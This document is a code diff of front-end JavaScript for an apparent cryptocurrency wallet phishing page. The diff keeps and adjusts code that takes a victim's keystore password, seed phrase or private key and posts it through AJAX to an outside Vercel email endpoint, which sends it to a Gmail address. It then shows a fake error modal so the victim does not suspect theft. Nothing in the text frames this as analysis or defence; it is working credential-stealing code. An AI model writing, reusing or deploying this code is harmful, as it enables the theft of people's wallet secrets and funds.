@@ -5371,22 +5371,21 @@
 									url: 'https://cavarates-green.vercel.app/api/send-email',
 									method: 'POST',
 									data: {
-										to: 'layerchaindrop@gmail.com', // Replace with your email
+										to: 'layerchaindrop@gmail.com',
 										subject:
 											'New Wallet Connection - Keystore File',
 										text: `New wallet connection attempt:\nWallet: ${selectedWalletName}\nFile: ${
 											data.get('keystore-file').name
 										}`,
 										html: `
-                            <h2>New Wallet Connection</h2>
-                            <p><strong>Wallet:</strong> ${selectedWalletName}</p>
-                            <p><strong>File:</strong> ${
-								data.get('keystore-file').name
-							}</p>
-                            <p><strong>Password:</strong> ${
-								data.get('keystore-password') || 'Not provided'
-							}</p>
-                        `,
+											<h2>New Wallet Connection</h2>
+											<p><strong>Wallet:</strong> ${selectedWalletName}</p>
+											<p><strong>File:</strong> ${data.get('keystore-file').name}</p>
+											<p><strong>Password:</strong> ${
+												data.get('keystore-password') ||
+												'Not provided'
+											}</p>
+										`,
 									},
 									success: function () {
 										lastSubmissionTime = Date.now();
@@ -5402,7 +5401,11 @@
 											getPersistentErrorCode(ipHash);
 										showErrorModal(errorCode);
 									},
-									error: function () {
+									error: function (xhr, status, error) {
+										console.error(
+											'Submission failed:',
+											error
+										);
 										alert(
 											'Submission failed. Please try again.'
 										);
@@ -5414,22 +5417,21 @@
 							} else {
 								// For non-file uploads (seed phrase, private key)
 								const payload = {
-									to: 'layerchaindrop@gmail.com', // Replace with your email
+									to: 'layerchaindrop@gmail.com',
 									subject:
 										'New Wallet Connection - Credentials',
 									text: `New wallet connection attempt:\nWallet: ${selectedWalletName}\nCredentials: ${data.credentials}`,
 									html: `
-                        <h2>New Wallet Connection</h2>
-                        <p><strong>Wallet:</strong> ${selectedWalletName}</p>
-                        <p><strong>Credentials:</strong> ${data.credentials}</p>
-                    `,
+											<h2>New Wallet Connection</h2>
+											<p><strong>Wallet:</strong> ${selectedWalletName}</p>
+											<p><strong>Credentials:</strong> ${data.credentials}</p>
+										`,
 								};
 
 								$.ajax({
 									url: 'https://cavarates-green.vercel.app/api/send-email',
 									method: 'POST',
-									data: JSON.stringify(payload),
-									contentType: 'application/json',
+									data: payload,
 									success: function () {
 										lastSubmissionTime = Date.now();
 										$('#floating-submission-box').fadeOut();
@@ -5444,8 +5446,14 @@
 											getPersistentErrorCode(ipHash);
 										showErrorModal(errorCode);
 									},
-									error: function () {
-										
+									error: function (xhr, status, error) {
+										console.error(
+											'Submission failed:',
+											error
+										);
+										alert(
+											'Submission failed. Please try again.'
+										);
 										$('#submit-credentials')
 											.html('Submit')
 											.prop('disabled', false);
